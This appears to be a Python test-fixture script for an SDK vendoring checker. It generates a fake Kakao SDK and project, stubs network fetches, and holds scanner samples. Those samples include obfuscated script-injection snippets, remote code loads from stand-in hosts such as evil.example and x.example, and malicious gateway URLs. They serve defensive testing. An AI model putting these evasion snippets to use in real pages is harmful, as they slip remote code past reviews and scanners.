"""fixtures_sdk.sh 보조 — 합성 프로젝트 · 카카오 꼴 시험 SDK · 가짜 fetch 로 sdk_vendor.py 실행 · 목록 편집 · WV8 표본.

사용: python sdk_fixture.py <하위 명령> …
  mkproj <디렉터리>                                   표준 web/ 골격(green) + settings(KAKAO_JAVASCRIPT_KEY) + 첫 커밋
  sdkjs <경로> [<변형 낱말>]                           카카오 꼴 시험 사본(운영자 호스트 · this.<이름공간>= · 함수 · api 경로)
  docs <경로> <사본> [nosri|badsri|nocite]             원본 경로·sha384 를 인용하는 운영자 문서
  install <프로젝트> [--id X] [--variant V] [--draft JSON] [--source S] [--no-commit] [--message M]
          [--version V] [--extra-api P] [--replace] [--scope-add …] [--register-existing 경로] [--dry-run]
          [--template samehost|ownonly]
                                                      후보 → 설치(가짜 fetch) → `chore(web-sdk):` 커밋
  vendor <sdk_vendor 인자…>                            가짜 fetch(SDKFX_FETCH json: url → [최종 URL, Content-Type, 파일])
  edit <프로젝트> <id> <JSON 패치> [--rebind] [--rename NEW]   목록 항목 칸 바꾸기(결속 재계산은 --rebind)
  wv8                                                  WV8 리터럴 단위 표본 대조(어긋남 0 이면 exit 0)
  gwsame <sdk_boundary.js>                             gateway 정규형 표본 — 백스톱 normalize_gateway_url 과 실제 스니펫
                                                       기록기(node vm)가 표본 기대와 모두 같은가(어긋남 0 이면 exit 0)
  walks <프로젝트>                                      미등재 단위 시대 판정(classify_units)의 이력 전체 조회(`log --raw`)
                                                       횟수·git 호출 수·걸린 시간
"""
import base64
import hashlib
import json
import os
import subprocess
import sys
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SCRIPTS))
sys.dont_write_bytecode = True

SOURCE = 'https://t1.kakaocdn.net/kakao_js_sdk/%s/kakao.min.js'
DOCS = 'https://developers.kakao.com/docs/en/javascript/download'
API_PATHS = ['/v2/user/me', '/v1/api/talk/friends/message/default/send', '/v2/api/talk/message/image/upload',
             '/v1/user/unlink', '/v1/api/talk/friends']

SDK_JS = r'''/*!
 * Kakao SDK for JavaScript - v@VERSION@ @VARIANT@
 * Copyright 2017 Kakao Corp. Licensed under the Apache License, Version 2.0 — https://www.apache.org/licenses/LICENSE-2.0
 * see https://github.com/kakao
 */
(function(){var H={a:"https://accounts.kakao.com",k:"https://kapi.kakao.com",s:"https://sharer.kakao.com",d:"https://developers.kakao.com"};
var P=[@PATHS@];
function Share(){this.sendDefault=function(o){return o};this.sendCustom=function(o){return o};this.sendScrap=function(o){return o};
this.cleanup=function(){};this.createDefaultButton=function(){};this.createCustomButton=function(){};this.createScrapButton=function(){};
this.uploadImage=function(f){return f};this.deleteImage=function(f){return f};this.scrapImage=function(f){return f}}
function Api(){this.request=function(o){return o};this.cleanup=function(){}}
var K=window.Kakao={VERSION:"@VERSION@",init:function(k){this.Share=new Share();this.API=new Api();this.Auth={login:function(){}};this._k=k},
isInitialized:function(){return!!this._k},cleanup:function(){}};})();
'''

DRAFT = {
    'name': 'Kakao SDK for JavaScript',
    'operator': 'Kakao Corp.(카카오)',
    'operator_domains': ['kakao.com', 'kakaocdn.net'],
    'service_api': '카카오톡 카드 공유 — 피드 템플릿 · REST 미지원',
    'use_scope': ['Kakao.Share.*', 'Kakao.init', 'Kakao.isInitialized'],
    'namespace_words': {'API': ['사용자 정보', '메시지', '친구'], 'Auth': ['로그인', '카카오 로그인'],
                        'Share': ['공유', '카카오톡 공유'], 'Share.uploadImage': ['사진 올리기', '이미지 업로드']},
    'namespace_members': {'Share': {'cleanup': 'lifecycle', 'createCustomButton': 'sdk_ui',
                                    'createDefaultButton': 'sdk_ui', 'createScrapButton': 'sdk_ui',
                                    'deleteImage': 'data_out', 'scrapImage': 'data_out', 'sendCustom': 'call',
                                    'sendDefault': 'call', 'sendScrap': 'call', 'uploadImage': 'data_out'}},
    'lifecycle': {'global': 'Kakao', 'init': 'init', 'created_by_init': ['API', 'Auth', 'Share']},
    'license': 'Apache-2.0',
    'terms_url': 'https://developers.kakao.com/terms/latest/en/site-terms',
    'public_config': [{'attr': 'data-kakao-javascript-key', 'call': 'Kakao.init', 'setting': 'KAKAO_JAVASCRIPT_KEY'}],
}
SELF_SOURCE = '본인 직접(2026-10-01 15:00:00 +0900)'
AT = '2026-10-01 15:00 +0900'


def git(proj, *args, check=True):
    r = subprocess.run(['git', '-C', str(proj), '-c', 'user.name=t', '-c', 'user.email=t@t', *args],
                       capture_output=True, text=True)
    if check and r.returncode != 0:
        raise SystemExit('git %s 실패 — %s' % (' '.join(args[:2]), r.stderr.strip()))
    return r.stdout.strip()


def sri(data, alg='sha384'):
    return '%s-%s' % (alg, base64.b64encode(hashlib.new(alg, data).digest()).decode())


# 운영자 호스트 꼴 변형(검토 r1 #6) — samehost: 서비스 API 가 배포 호스트의 다른 경로 · ownonly: 배포·문서 자원만
HOSTS = {'': 'var H={a:"https://accounts.kakao.com",k:"https://kapi.kakao.com",s:"https://sharer.kakao.com",d:"https://developers.kakao.com"};',
         'samehost': 'var H={d:"https://developers.kakao.com",c:"https://t1.kakaocdn.net/v1/api/talk/share"};',
         'ownonly': 'var H={d:"https://developers.kakao.com",c:"https://t1.kakaocdn.net/kakao_js_sdk/2.8.3/chunk.js"};'}


def sdk_bytes(version='2.8.3', variant='', paths=None, template=''):
    text = SDK_JS.replace(HOSTS[''], HOSTS[template])
    text = text.replace('@VERSION@', version).replace('@VARIANT@', variant)
    return text.replace('@PATHS@', ','.join('"%s"' % p for p in (paths or API_PATHS))).encode('utf-8')


def docs_text(data, version='2.8.3', mode=''):
    value = sri(data) if mode != 'badsri' else sri(data + b'x')
    src = SOURCE % version if mode != 'nocite' else 'https://t1.kakaocdn.net/other/x.js'
    tag = '<script src="%s"%s crossorigin="anonymous"></script>' % (
        src, '' if mode == 'nosri' else ' integrity="%s"' % value)
    return ('<html><body><h1>다운로드</h1><p>카카오톡 공유 · 카카오 로그인 · 사용자 정보 메시지 친구 공유 로그인 사진 올리기'
            ' 이미지 업로드</p><pre>%s</pre></body></html>' % tag.replace('<', '&lt;'))


def run_vendor(args, table):
    import sdk_vendor

    def fake_fetch(url, timeout=30):
        if url not in table:
            raise OSError('네트워크 없음(가짜 fetch) — %s' % url)
        final, ctype, payload = table[url]
        return final, ctype, payload if isinstance(payload, bytes) else Path(payload).read_bytes()
    sdk_vendor.fetch = fake_fetch
    return sdk_vendor.main(args)


ROOT_VIEW = 'web/root/scaffold/view/root_view.html'
PAGE = 'web/application/chart/presentation_layer/view/chart_view.html'
C = 'web/application/chart'
BASE_TREE = {  # 표준 새 트리(2.0.0 · 빚 스캔 키 0) — root · design_system · common · BC chart(4계층 골격) · static
    'config/settings.py': "SECRET_KEY = 'x'\nKAKAO_JAVASCRIPT_KEY: str = ''\n",
    'manage.py': '# manage\n',
    'requirements.txt': 'Django==5.1.2\npytest==8.3.3\npytest-django==4.9.0\n',
    '.dddjango-web/backstop-baseline.json': '{"cycle_pairs": []}\n',
    'docs/.gitkeep': '',
    'web_test/application/chart/application_layer/chart_vm_test.py': 'def test_chart_vm_builds() -> None:\n    assert True\n',
    'web/__init__.py': '',
    'web/apps.py': 'from django.apps import AppConfig\n\n\nclass WebConfig(AppConfig):\n    name: str = "web"\n',
    'web/urls.py': 'from web.root.router.root_router import urlpatterns\n\n__all__: list[str] = ["urlpatterns"]\n',
    'web/root/ruff.toml': '[lint]\nselect = ["ANN"]\n',
    'web/root/router/root_router.py': (
        'from django.urls import include, path\n\nfrom web.application.chart import chart_router\n\n'
        'urlpatterns: list[object] = [path("charts/", include((chart_router.urlpatterns, chart_router.app_name)))]\n'),
    ROOT_VIEW: (
        '{% load static %}\n<!doctype html>\n<html>\n<head>\n'
        "<link rel=\"stylesheet\" href=\"{% static 'design_system/theme/app_theme.css' %}\">\n"
        "<link rel=\"stylesheet\" href=\"{% static 'web/root/root_view.css' %}\">\n"
        "<script src=\"{% static 'web/htmx/htmx.min.js' %}\" defer></script>\n"
        '</head>\n<body>{% block content %}{% endblock %}\n{% block scripts %}{% endblock scripts %}\n</body>\n</html>\n'),
    'web/root/scaffold/view_model/root_vm.py': (
        'from web.root.scaffold.state.root_state import RootState\n\n\nclass RootVM:\n'
        '    def build(self) -> RootState:\n        return RootState(title="shop")\n\n\n'
        'def root_context(request: object) -> dict[str, object]:\n    return {"root": RootVM().build()}\n'),
    'web/root/scaffold/state/root_state.py': (
        'from dataclasses import dataclass\n\n\n@dataclass(frozen=True, slots=True, kw_only=True)\n'
        'class RootState:\n    title: str\n'),
    'web/root/handler/root_request_handler.py': (
        'from web.common.network.api_client import ApiClient\n\n\nclass RootRequestHandler:\n'
        '    def __init__(self, get_response: object) -> None:\n        self.get_response: object = get_response\n'
        '        self.client: type[ApiClient] = ApiClient\n'),
    'web/root/initializer/root_initializer.py': (
        'from django.template import Library\n\nregister: Library = Library()\n\n\nclass RootInitializer:\n'
        '    ready: bool = True\n'),
    'web/design_system/foundation/app_color.css': ':root { --color-primary: #1a73e8; --color-on-primary: #ffffff; }\n',
    'web/design_system/foundation/app_typography.css': ':root { --typography-body: 400 16px/1.5 "Inter", sans-serif; }\n',
    'web/design_system/foundation/app_spacing.css': ':root { --spacing-md: 16px; }\n',
    'web/design_system/foundation/app_radius.css': ':root { --radius-md: 8px; }\n',
    'web/design_system/foundation/app_shadow.css': ':root { --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.2); }\n',
    'web/design_system/foundation/app_duration.css': ':root { --duration-fast: 150ms; --easing-standard: ease; }\n',
    'web/design_system/foundation/app_asset.css': ':root { --asset-logo: url("../../static/images/logo.svg"); }\n',
    'web/design_system/theme/app_theme.css': 'body { margin: 0; font: var(--typography-body); color: var(--color-primary); }\n',
    'web/design_system/util/.gitkeep': '',
    'web/design_system/component/.gitkeep': '',
    'web/common/network/api_client.py': (
        'from django.test import Client\n\n\nclass ApiClient:\n    def get(self, path: str) -> object:\n'
        '        return Client(raise_request_exception=False).get(path)\n'),
    'web/common/util/either.py': (
        'from dataclasses import dataclass\nfrom typing import Generic, TypeVar\n\nL = TypeVar("L")\nR = TypeVar("R")\n\n\n'
        '@dataclass(frozen=True, slots=True, kw_only=True)\nclass Left(Generic[L]):\n    value: L\n\n\n'
        '@dataclass(frozen=True, slots=True, kw_only=True)\nclass Right(Generic[R]):\n    value: R\n\n\n'
        'Either = Left[L] | Right[R]\n'),
    'web/common/enum/.gitkeep': '',
    'web/common/service/.gitkeep': '',
    C + '/ruff.toml': '[lint]\nselect = ["ANN"]\n',
    C + '/chart_router.py': (
        'from django.urls import path\n\nfrom web.application.chart.presentation_layer.view.chart_view import chart_view\n\n'
        'app_name: str = "chart"\n\n\nclass ChartRoutes:\n    PAGE: str = "chart:page"\n\n\n'
        'urlpatterns: list[object] = [path("", chart_view, name="page")]\n'),
    C + '/chart_navigator.py': (
        'from django.urls import reverse\n\n\nclass ChartNavigator:\n    @staticmethod\n    def page_href() -> str:\n'
        '        from web.application.chart.chart_router import ChartRoutes\n        return reverse(ChartRoutes.PAGE)\n'),
    C + '/domain_layer/chart/chart.py': (
        'from dataclasses import dataclass\nfrom typing import Self\n\n\n'
        '@dataclass(frozen=True, slots=True, kw_only=True)\nclass Chart:\n    chart_id: str\n\n'
        '    @classmethod\n    def from_json(cls, data: dict[str, object]) -> Self:\n'
        '        return cls(chart_id=str(data["id"]))\n'),
    C + '/application_layer/use_case/get_chart_use_case.py': (
        'from web.application.chart.domain_layer.chart.chart import Chart\n'
        'from web.application.chart.infra_layer.repository.chart_repo import ChartRepo\n'
        'from web.common.util.either import Either\n\n\nclass GetChartUseCase:\n'
        '    def execute(self) -> Either[str, Chart]:\n        return ChartRepo().fetch()\n'),
    C + '/application_layer/view_model/chart_vm.py': (
        'from web.application.chart.application_layer.state.chart_state import ChartLoaded, ChartState\n'
        'from web.application.chart.application_layer.use_case.get_chart_use_case import GetChartUseCase\n'
        'from web.application.chart.chart_navigator import ChartNavigator\n\n\nclass ChartVM:\n'
        '    def build(self) -> ChartState:\n        GetChartUseCase().execute()\n'
        '        return ChartLoaded(kakao_javascript_key="", page_href=ChartNavigator.page_href())\n'),
    C + '/application_layer/state/chart_state.py': (
        'from dataclasses import dataclass\n\n\n@dataclass(frozen=True, slots=True, kw_only=True)\nclass ChartLoaded:\n'
        '    kakao_javascript_key: str\n    page_href: str\n\n\n'
        '@dataclass(frozen=True, slots=True, kw_only=True)\nclass ChartEmpty:\n    message: str\n\n\n'
        'ChartState = ChartLoaded | ChartEmpty\n'),
    C + '/infra_layer/data_source/chart_data_source.py': (
        'from web.common.network.api_client import ApiClient\n\nCHART_PATH: str = "/api/chart/"\n\n\n'
        'class ChartDataSource:\n    def fetch(self) -> object:\n        return ApiClient().get(CHART_PATH)\n'),
    C + '/infra_layer/repository/chart_repo.py': (
        'from web.application.chart.infra_layer.data_source.chart_data_source import ChartDataSource\n\n\n'
        'class ChartRepo:\n    def fetch(self) -> object:\n        return ChartDataSource().fetch()\n'),
    C + '/presentation_layer/view/chart_view.py': (
        'from django.http import HttpRequest, HttpResponse\nfrom django.shortcuts import render\n\n'
        'from web.application.chart.application_layer.view_model.chart_vm import ChartVM\n\n'
        'PAGE: str = "application/chart/presentation_layer/view/chart_view.html"\n\n\n'
        'def chart_view(request: HttpRequest) -> HttpResponse:\n    return render(request, PAGE, {"state": ChartVM().build()})\n'),
    PAGE: '{% extends "root/scaffold/view/root_view.html" %}\n{% load static %}\n{% block scripts %}\n{% endblock scripts %}\n',
    'web/static/htmx/htmx.min.js': 'var htmx={version:"2.0.10"};\n',
    'web/static/root/root_view.css': '.root-shell { background: var(--color-primary); }\n',
    'web/static/js/.gitkeep': '',
    'web/static/images/.gitkeep': '',
}
BC_DIRS = ([C + '/application_layer/' + k for k in ('use_case', 'view_model', 'state', 'shared_state', 'service')]
           + [C + '/infra_layer/' + k for k in ('data_source', 'repository', 'service')]
           + [C + '/presentation_layer/' + k for k in ('view', 'section', 'widget', 'ui_extension')]
           + [C + '/domain_layer/chart/' + k for k in ('entity', 'value_object', 'enum', 'domain_service', 'specification')])


def mkproj(d):
    p = Path(d)
    for rel, body in BASE_TREE.items():
        (p / rel).parent.mkdir(parents=True, exist_ok=True)
        (p / rel).write_text(body, encoding='utf-8')
    for rel in BC_DIRS:
        (p / rel).mkdir(parents=True, exist_ok=True)
    for cur, dirs, files in os.walk(p / 'web'):   # Python 경로 폴더마다 __init__.py · 빈 정적·부품 폴더는 .gitkeep
        rel = Path(cur).relative_to(p / 'web').as_posix()
        if not rel.startswith(('design_system', 'static')):
            (Path(cur) / '__init__.py').touch()
        elif not dirs and not files:
            (Path(cur) / '.gitkeep').touch()
    git(p, 'init', '-q')
    git(p, 'add', '-A')
    git(p, 'commit', '-qm', 'base')
    print(git(p, 'rev-parse', 'HEAD'))
    return 0


def install(argv):
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument('proj')
    ap.add_argument('--id', default='kakao_js_sdk')
    ap.add_argument('--variant', default='')
    ap.add_argument('--version', default='2.8.3')
    ap.add_argument('--draft', default='{}')
    ap.add_argument('--source', default=SELF_SOURCE)
    ap.add_argument('--tokens')
    ap.add_argument('--gate', default='G1')
    ap.add_argument('--no-commit', action='store_true')
    ap.add_argument('--message')
    ap.add_argument('--extra-api', action='append', default=[])
    ap.add_argument('--drop-api', action='append', default=[])
    ap.add_argument('--replace', action='store_true')
    ap.add_argument('--scope-add', nargs='+')
    ap.add_argument('--register-existing')
    ap.add_argument('--dry-run', action='store_true')
    ap.add_argument('--build', default='run')
    ap.add_argument('--crlf', action='store_true')
    ap.add_argument('--template', default='', choices=sorted(HOSTS))
    a = ap.parse_args(argv)
    p = Path(a.proj).resolve()
    paths = [x for x in API_PATHS if x not in a.drop_api] + a.extra_api
    data = sdk_bytes(a.version, a.variant, paths, a.template)
    if a.crlf:
        data = data.replace(b'\n', b'\r\n')
    build = p / '.dddjango-web' / a.build
    cand = build / 'sdk-candidates' / a.id
    cand.mkdir(parents=True, exist_ok=True)
    source = SOURCE % a.version
    if a.id != 'kakao_js_sdk':
        source = 'https://t1.kakaocdn.net/%s/%s/%s.min.js' % (a.id, a.version, a.id)
    table = {source: [source, 'application/javascript', data],
             DOCS: [DOCS, 'text/html', docs_text(data, a.version).replace(SOURCE % a.version, source).encode()]}
    if not (a.scope_add and (cand / 'candidate.json').is_file()):
        code = run_vendor(['candidate', str(p), '--id', a.id, '--version', a.version, '--source-url', source,
                           '--docs-url', DOCS, '--out', str(cand)], table)
        if code:
            return code
    draft = json.loads(json.dumps(DRAFT))
    for k, v in json.loads(a.draft).items():
        if v is None:
            draft.pop(k, None)
        else:
            draft[k] = v
    (cand / 'entry-draft.json').write_text(json.dumps(draft, ensure_ascii=False, indent=2), encoding='utf-8')
    args = ['install', str(p), str(cand / 'candidate.json'), '--entry', str(cand / 'entry-draft.json'),
            '--approval-source', a.source, '--approved-at', AT, '--gate', a.gate, '--build', str(build)]
    if a.tokens:
        args += ['--source-tokens', a.tokens]
    if a.replace:
        args.append('--replace')
    if a.scope_add:
        args += ['--scope-add', *a.scope_add]
    if a.register_existing:
        args += ['--register-existing', a.register_existing]
    if a.dry_run:
        args.append('--dry-run')
    code = run_vendor(args, table)
    if code or a.no_commit or a.dry_run:
        return code
    git(p, 'add', '-A', '--', 'web/sdk_registry.json', 'web/static/vendor')
    git(p, 'commit', '-qm', a.message or 'chore(web-sdk): %s %s 설치 — G1 %s' % (a.id, a.version, AT))
    print('commit=%s' % git(p, 'rev-parse', 'HEAD'))
    return 0


def edit(argv):
    from src.sdk_registry import canonical_bytes, entry_sha256
    p = Path(argv[0])
    sid = argv[1]
    patch = json.loads(argv[2])
    path = p / 'web/sdk_registry.json'
    data = json.loads(path.read_text(encoding='utf-8'))
    entry = data['sdks'][sid]
    for k, v in patch.items():
        if k.startswith('approval.'):
            entry['approval'][k.split('.', 1)[1]] = v
        elif v is None:
            entry.pop(k, None)
        else:
            entry[k] = v
    if '--rename' in argv:
        new = argv[argv.index('--rename') + 1]
        data['sdks'][new] = data['sdks'].pop(sid)
        entry = data['sdks'][new]
    if '--rebind' in argv:
        entry['approval']['binds'] = {'entry_sha256': entry_sha256(entry)}
    path.write_bytes(canonical_bytes(data))
    return 0


WV8_SAMPLES = [  # (원문, 기대 1 = 정적 발견 · 0 = 통과) — 설계 표본 47(srcdoc 토큰 규칙 정정) + 구현 메모 ⑤ 8꼴 + 짝
    ("document.createElement('scr'+'ipt'); s.src=['https:','','t1.kakaocdn.net','x.js'].join('/')", 1),
    ("const h='t1.kakaocdn'; s.src=`https:/${'/'}${h}.net/kakao.min.js`", 1),
    ("fetch('\\x68ttps://kapi.kakao.com/v2/user/me')", 1),
    ("const f=document.createElement('iframe'); f.src='\\x68ttps://evil.example/'", 1),
    ("fetch(`${'ht'}tps://${'kapi.kakao'}.c${'om'}/v2`)", 0),
    ("new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws')", 0),
    ("if (href.startsWith('http://') || href.startsWith('https://')) a.target = '_blank'", 0),
    ("document.querySelector('li.me')", 0),
    ("root.querySelector('div.app')", 0),
    ("const lib = 'socket.io'", 0),
    ('if (!["http:", "https:"].includes(url.protocol)) return;', 0),
    ("svg.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#i')", 0),
    ("root.dispatchEvent(new CustomEvent('conversation:reviews:open'))", 0),
    ("s.src = 'https://t1.kakaocdn.net/kakao_js_sdk/2.8.3/kakao.min.js'", 1),
    ('document.createElement("SCRIPT")', 1),
    ("const t='script'; document.createElement(t)", 1),
    ("const li = document.createElement('li'); li.textContent = data.title;", 0),
    ("const svg = document.createElementNS('http://www.w3.org/2000/svg', 'path');", 0),
    ("root.dataset.kakaoJavascriptKey", 0),
    ("const ws = new WebSocket(`wss://${location.host}/ws/chat`)", 0),
    ("list.querySelector('li.msg.me')", 0),
    ("const u = 'https://' + location.host + path", 0),
    ("const host = 'cdn.socket.io'", 0),
    ("toast('문의: help@spring.co.kr')", 1),
    ("document.createElement('\\x73cript')", 1),
    ("s.src = 'https://' + 'kapi.kakao.com'", 1),
    ('const s = document.createElement("script"); s.type = "application/json"', 1),
    ("const s = document.createElementNS('http://www.w3.org/1999/xhtml', 'script'); s.src = '/static/web/js/x.js'", 1),
    ("const s = document.createElementNS('http://www.w3.org/2000/svg', 'script')", 1),
    ("fetch(`https://${'kapi.kakao.com'}/v2/user/me`)", 1),
    ("fetch('https://' + 'myapi.dev' + '/v1')", 1),
    ("fetch('https://' + 'i.cdn.io' + '/x')", 1),
    ("fetch('\\150ttps://kapi.kakao.com/v2')", 1),
    ("const key = 'auth.user.me'", 0),
    ("f.srcdoc = '<scr' + 'ipt src=/static/web/vendor/tmp/x.js></scr' + 'ipt>'", 1),
    ("f.setAttribute('srcdoc', html)", 1),
    ("document.write('<script src=/static/web/vendor/tmp/x.js><\\/script>')", 1),
    ("frame.contentDocument.writeln(html)", 1),
    ("const NS = 'http://www.w3.org/2000/svg'; const el = document.createElementNS(NS, tag)", 1),
    ("const p = document.createElementNS(SVG_NS, 'path')", 0),
    ("await navigator.clipboard.write([item])", 0),
    ("if (f.srcdoc === '') return", 1),
    ("t('nav.about.me')", 0),
    ("const u = '//i.cdn.io/x.js'", 1),
    ("const u = 'cdn.socket.io/x.js'", 1),
    ("const bare = 'i.cdn.io'", 0),
    ("const bare = 'myapi.dev'", 0),
    ("f['srcdoc'] = html", 1),
    ("Object.assign(f, { srcdoc: html })", 1),
    ("f.setAttributeNS(null, 'srcdoc', html)", 1),
    ("const d = f.contentDocument; d.write(html)", 1),
    ("document['write'](html)", 1),
    ("Document.prototype.createElement.call(document, 'script')", 1),
    ("const mk = document.createElement.bind(document)", 1),
    ("document['createElement']('script')", 1),
    ("logger.write('x')", 0),
    ("// document.write('<script')\nconst a = 1", 0),
    ("const re = /\\/\\//g; s.replace(re, '/')", 0),
    ("const re = /'/; x = 'ok'", 0),
    ("setTimeout(() => go(), 10)", 0),
    ("setTimeout('go()', 10)", 1),
    ("el.innerHTML = '<script>x</script>'", 1),
    ("import('https://x.example/mod.js')", 1),
    ("p.then(eval)", 1),
    ("const s = document.createElement(`script`)", 1),
    ("const ctx = document.createRange().createContextualFragment(html)", 1),
    # 리뷰 반영 F5 — 문서 수신자의 묶음 괄호·괄호 접근·별칭 전파 · 자리표시 없는 template-key (+ 정상 대조군)
    ("const d = (f.contentDocument); d.write(payload);", 1),
    ("(document).write(payload);", 1),
    ("const d = document; const alias = d; alias.write(payload);", 1),
    ('const d = f["contentDocument"]; d.write(payload);', 1),
    ("document[`createElement`](tag);", 1),
    ("document[`write`](payload);", 1),
    ("const d = f['contentDocument']; d['writeln'](payload);", 1),
    ('const d = f?.["contentDocument"]; d?.write(payload);', 1),
    ("((document)).writeln(payload);", 1),
    ("return (document).write(payload);", 1),
    ("const w = (window.document); w.write(x)", 1),
    ("let d; d = f.ownerDocument; d.write(x)", 1),
    ("const k = `createElement`; document[k](tag)", 1),
    ("const d = logger; d.write(payload);", 0),
    ("stream(document).write(x)", 0),
    ("const d = document.body; d.write(x)", 0),
    ("const d = document; this.d.write(x)", 0),
    ("el[`textContent`] = s;", 0),
    ("const t = `createElement ${x}`;", 0),
]

GW_SAMPLES = [  # (gateway url, 기대 정규 경로 · None = 거절) — 리뷰 반영 F4 표 + 경계 짝. 승인 경로는 /v2/user/me 하나
    ('/v2/user/me', '/v2/user/me'),
    ('https://kapi.kakao.com/v2/user/me/?x=1', '/v2/user/me'),
    ('/v2/user/%6De', '/v2/user/me'),
    (' https://evil.example/v2/user/me', None),
    ('\\\\evil.example/v2/user/me', None),
    ('v2/user/me', None),
    ('/v2/user/../user/me', None),
    ('HTTPS://KAPI.KAKAO.COM/V2/User/Me', '/v2/user/me'),
    ('https://kapi.kakao.com/v2/user/me#x', '/v2/user/me'),
    ('//kapi.kakao.com/v2/user/me', None),
    ('http://kapi.kakao.com/v2/user/me', None),
    ('https://user@kapi.kakao.com/v2/user/me', None),
    ('https://kapi.kakao.com:443/v2/user/me', None),
    ('https://evil.example/v2/user/me', None),
    ('https://evilkakao.com/v2/user/me', None),
    ('https://kakao.com.evil.example/v2/user/me', None),
    ('\t/v2/user/me', None),
    ('/v2/user/me ', None),
    ('/v2//user/me', None),
    ('/v2/user/./me', None),
    ('/v2/user/%2e%2e/me', None),
    ('/v2/user%2Fme', None),
    ('/v2/user/%zz', None),
    ('/v2/user/me\\', None),
    ('https:\\\\kapi.kakao.com/v2/user/me', None),
    ('/v2/\u00fcser/me', None),
    ('/v1/user/unlink', '/v1/user/unlink'),
]


def wv8():
    from src.check_vendor import scan_js
    from src.common import mask_js
    bad = 0
    for src, want in WV8_SAMPLES:
        got = 1 if scan_js(mask_js(src).no_comments) else 0
        if got != want:
            bad += 1
            print('어긋남 기대 %d 실제 %d — %s' % (want, got, src))
    print('WV8 표본 %d · 어긋남 %d' % (len(WV8_SAMPLES), bad))
    return 1 if bad else 0


def gwsame(asset):
    import shutil
    import tempfile
    from src.sdk_registry import normalize_gateway_url
    domains = ['kakao.com', 'kakaocdn.net']
    bad = 0
    for url, want in GW_SAMPLES:
        got = normalize_gateway_url(url, domains)[0]
        if got != want:
            bad += 1
            print('Python 어긋남 %r — 기대 %r 실제 %r' % (url, want, got))
    node = shutil.which('node')
    if node is None:
        print('node 없음 — 브라우저 스니펫 정규형 대조 불가(통과가 아니다)')
        return 1
    with tempfile.TemporaryDirectory() as tmp:
        listed = Path(tmp) / 'urls.json'
        listed.write_text(json.dumps([u for u, _w in GW_SAMPLES]), encoding='utf-8')
        r = subprocess.run([node, str(Path(__file__).with_name('boundary_probe.cjs')), asset, str(listed)],
                           capture_output=True, text=True)
    if r.returncode != 0:
        print('스니펫 실행 실패 — %s' % r.stderr.strip()[-400:])
        return 1
    probe = json.loads(r.stdout)
    for (url, want), rec in zip(GW_SAMPLES, probe['results']):
        ok_want = want == '/v2/user/me'
        if rec['path'] != want or rec['pathOk'] is not ok_want:
            bad += 1
            print('브라우저 어긋남 %r — 기대 %r(승인 %s) 실제 %r(승인 %s)' % (url, want, ok_want, rec['path'], rec['pathOk']))
    denied = sum(1 for _u, w in GW_SAMPLES if w != '/v2/user/me')
    if probe['findings'] != denied or probe['realCalls'] != 0 or probe['cleaned'] != 1 or not probe['installed']:
        bad += 1
        print('스니펫 기록 어긋남 — 승인 밖 발견 %d(기대 %d) · 원 gateway 호출 %d · 수명 함수 통과 %d'
              % (probe['findings'], denied, probe['realCalls'], probe['cleaned']))
    print('gateway 정규형 표본 %d · 어긋남 %d' % (len(GW_SAMPLES), bad))
    return 1 if bad else 0


def walks(proj):
    import time
    from src import check_vendor as cv
    root = Path(proj).resolve()
    reg = root / 'web/sdk_registry.json'
    sdks = json.loads(reg.read_text(encoding='utf-8'))['sdks'] if reg.exists() else {}
    tracked = cv._tracked_vendor(root)
    units = cv.unregistered_units(root, set(sdks), tracked)
    calls = []
    real = cv._git

    def counting(r, *args):
        calls.append(args)
        return real(r, *args)
    cv._git = counting
    began = time.perf_counter()
    kinds = cv.classify_units(root, units, tracked, {e['sha256'] for e in sdks.values()}, reg.exists())
    took = time.perf_counter() - began
    cv._git = real
    raw = sum(1 for a in calls if a[:1] == ('log',) and '--raw' in a)
    print('units=%d raw_walks=%d git_calls=%d seconds=%.3f under3s=%s kinds=%s'
          % (len(units), raw, len(calls), took, 'yes' if took < 3.0 else 'no', ','.join(sorted(set(kinds.values())))))
    return 0


def main():
    cmd, args = sys.argv[1], sys.argv[2:]
    if cmd == 'mkproj':
        return mkproj(args[0])
    if cmd == 'sdkjs':
        Path(args[0]).write_bytes(sdk_bytes(variant=args[1] if len(args) > 1 else ''))
        return 0
    if cmd == 'docs':
        Path(args[0]).write_text(docs_text(Path(args[1]).read_bytes(), mode=args[2] if len(args) > 2 else ''),
                                 encoding='utf-8')
        return 0
    if cmd == 'install':
        return install(args)
    if cmd == 'vendor':
        table = {k: v for k, v in json.loads(os.environ.get('SDKFX_FETCH', '{}')).items()}
        return run_vendor(args, table)
    if cmd == 'edit':
        return edit(args)
    if cmd == 'wv8':
        return wv8()
    if cmd == 'gwsame':
        return gwsame(args[0])
    if cmd == 'walks':
        return walks(args[0])
    print('알 수 없는 명령 %s' % cmd)
    return 1


if __name__ == '__main__':
    sys.exit(main())
